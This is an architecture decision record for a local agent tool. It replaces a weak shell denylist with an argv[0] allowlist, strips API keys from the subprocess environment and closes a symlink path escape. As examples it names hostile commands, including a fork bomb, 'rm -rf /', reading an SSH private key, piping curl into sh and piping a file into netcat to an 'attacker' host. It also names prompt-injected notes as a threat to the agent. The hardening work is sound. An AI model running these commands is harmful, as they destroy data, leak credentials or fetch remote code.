---
title: "ADR-073 — Worker Native-Shell Command Allowlisting & Symlink-Safe Path Checks"
created: 2026-09-04
type: adr
parent: index
tags:
  - sympose/architecture
  - engineering/adr
  - security
---

# ADR-073 — Worker Native-Shell Command Allowlisting & Symlink-Safe Path Checks

- **Status:** Accepted (A + 073.1 + 073.2) — implemented 2026-09-04, with one
  deliberate deviation from A's literal wording (segment-checked pipes/chains
  instead of rejecting shell metacharacters outright). 073.1 (`realpath` in
  `is_safe_path`) shipped earlier the same day under Tier 1. See
  **Implementation Note** below. Extends
  [ADR-013](../2026-08/2026-08-24_adr-013-mcp-ephemeral-subagent-worker-sandbox.md)
  and [ADR-026](../2026-08/2026-08-25_adr-026-subagent-worker-spatial-environment-sandbox.md)
  (worker sandbox), and
  [ADR-002](../2026-08/2026-08-24_adr-002-master-vault-domain-sandboxing.md)
  (`is_safe_path`). Source:
  [2026-09-04 Backend Architecture & Objective-Effectiveness Review](./2026-09-04_backend-architecture-effectiveness-review.md) (F13, F15).
- **Date:** 2026-09-04
- **Deciders:** damiro (Lead Architect); Grace (Engineering Partner)

## Context

`NativeTools.execute("run_command", …)` runs model-generated command strings with
`shell=True` ([native_tools.py:76](../../../sympose/native_tools.py#L76)). The
only guards are:

- a **3-entry denylist** — `rm -rf /`, `mkfs`, `:(){ :|:& };:`
  ([native_tools.py:81-83](../../../sympose/native_tools.py#L81-L83)); and
- a regex that rejects a command **only if it mentions the name of a sibling
  vault folder** outside the persona's whitelist
  ([native_tools.py:85-95](../../../sympose/native_tools.py#L85-L95)).

Nothing constrains `cat ~/.ssh/id_rsa`, `curl https://… | sh`, `git push`,
`env`, `scp`, `python -c …`. Any `SPAWN_WORKER` spec token that is neither a
known skill nor a known MCP server is passed through as a skill name
([actions.py:155-157](../../../sympose/actions.py#L155-L157)), so the worker path
is broadly reachable, and worker synthesis is itself re-parsed for action tags
(F7).

Separately, `is_safe_path` ([config.py:168-175](../../../sympose/config.py#L168-L175))
compares `os.path.abspath` values with `commonpath` but never calls
`os.path.realpath` — a symlink placed inside an allowed vault folder that points
at `/etc` (or anywhere) passes the check.

Sympose is local-first and single-user, so the threat model is "a model
mistake or a prompt-injected vault note causes an unintended local action," not
a remote attacker. But that is a decision to make explicitly, not to inherit by
omission.

## Decision

Proposed — one of the following, decided by damiro:

- **ADR-073-A (recommended) — argv[0] allowlist + scrubbed execution.** Parse the
  command with `shlex.split`; permit only a configurable allowlist of first
  tokens (`git`, `ls`, `find`, `rg`, `cat`, `head`, `tail`, `wc`, `pytest`,
  `python`, `node`, `npm`, …). Reject shell metacharacters (`|`, `>`, `` ` ``,
  `$(`, `&&`, `;`) unless the invocation is explicitly wrapped. Run with
  `cwd` forced to the workspace root and a minimal scrubbed `env`
  (`PATH`, `HOME`, `LANG` only; no `*_API_KEY`, no `AWS_*`, no `SSH_*`).
- **ADR-073-B — off by default, opt-in flag.** `run_command` returns a "shell
  execution disabled" result unless `tools.allow_shell: true` is set in
  `config.yaml`. `read_file` and `web_search` stay always-on. Users who want the
  worker to run git/pytest turn it on knowingly.

Independent of A/B:

- **ADR-073.1 — `realpath` in `is_safe_path`.** Resolve symlinks on both operands
  before `commonpath`. Covers F15 and hardens every vault read/write path.
- **ADR-073.2 — scrubbed `env` for `run_command`** even under option A's
  allowlist (provider keys must never reach a subprocess).

## Consequences

**Positive**

- A: the worker can still do its real job (inspect the repo, run tests, git
  status/diff) while credential exfiltration and network-pipe-to-shell are off
  the table.
- B: zero attack surface by default; the capability is a deliberate switch.
- 073.1 closes a real sandbox-escape in the vault layer, not just the worker.

**Negative / costs**

- A: allowlist maintenance; some legitimate compound commands
  (`git log | head`) need an explicit wrapper or a small set of permitted pipes.
- B: the "anti-helplessness axiom" (README) leans on the worker being able to
  act; a disabled-by-default shell means first-run users must flip the flag to
  get git/pytest behaviour. Mitigation: ship the flag `true` in the CLI default
  config, `false` in the Slack daemon default.

## Implementation Note (2026-09-04)

- **073-A (argv[0] allowlist)** — implemented as `NativeTools._shell_allowlist()`
  / `_segment_commands()`, backed by `worker.shell_allowlist` in config.yaml
  (default: read/inspect commands only — `ls`, `cat`, `grep`, `find`, `git`,
  `head`, `tail`, `wc`, `sort`, `diff`, `stat`, `which`, `env`, … — no `rm`,
  `curl`, `scp`, `git push`, or interpreters by default). **Deviates from the
  literal wording**: instead of rejecting shell metacharacters (`|`, `&&`,
  `;`) outright and requiring an "explicit wrapper" for compound commands, the
  command line is split on those operators and **every segment's** argv[0] is
  checked against the allowlist — `git log | head` runs with no special
  syntax, `cat file | nc attacker 1234` is blocked because `nc` isn't listed.
  This directly resolves the ADR's own "Negative/costs" note about compound
  commands needing a wrapper, with less new syntax for the model to learn,
  at the cost of a best-effort (not shell-grammar-exact) operator split —
  acceptable for the stated single-user, "model mistake not remote attacker"
  threat model.
- **073.2 (scrubbed env)** — implemented as `NativeTools._scrubbed_env()`:
  `run_command`'s subprocess now receives only `PATH`, `HOME`, `LANG`,
  `LC_ALL`, `USER`, `SHELL`, `TERM`, `TMPDIR`, `PWD`, and `GIT_*` — every
  provider API key (`GEMINI_API_KEY`, `ANTHROPIC_API_KEY`, …), Slack token,
  and any `AWS_*`/`SSH_*` credential is withheld regardless of which command
  runs, independent of the A/B choice as scoped.
- **073.1 (`realpath` in `is_safe_path`)** — implemented earlier the same day
  under Tier 1 (F15); see the
  [implementation journal](./2026-09-04_backend-hardening-implementation.md).
- **073-B (off-by-default flag)** — not built; A was chosen over B because a
  read/inspect-only default allowlist already gives "zero attack surface for
  the things B was protecting against" (destructive commands, exfiltration,
  credential leakage) without disabling the worker's actual job (inspecting
  the repo, running tests, `git status`/`diff`) the way B's default-off flag
  would.

Verified with unit tests in `tests/unit/test_native_tools.py` (allowed/blocked
commands, chained `&&`/`|` segment checks, `worker.shell_allowlist` config
override, env-scrub — API key absent from `env` output, `PATH` still present).
`.venv/bin/pytest` green throughout.

## Alternatives rejected

- **Expand the denylist.** Denylists for shell strings are unwinnable
  (`$IFS`, base64, `\x2f`); an allowlist is the only tractable direction.
- **Full OS sandbox (`sandbox-exec`, containers, `bwrap`).** Real isolation, but
  platform-specific and against the zero-infra mandate. **Revisit trigger:**
  Sympose ever running untrusted or multi-tenant workloads.
- **Keep as-is.** The folder-name regex is not a security boundary and should
  not be described as one in ADR-013/026; this ADR corrects that.
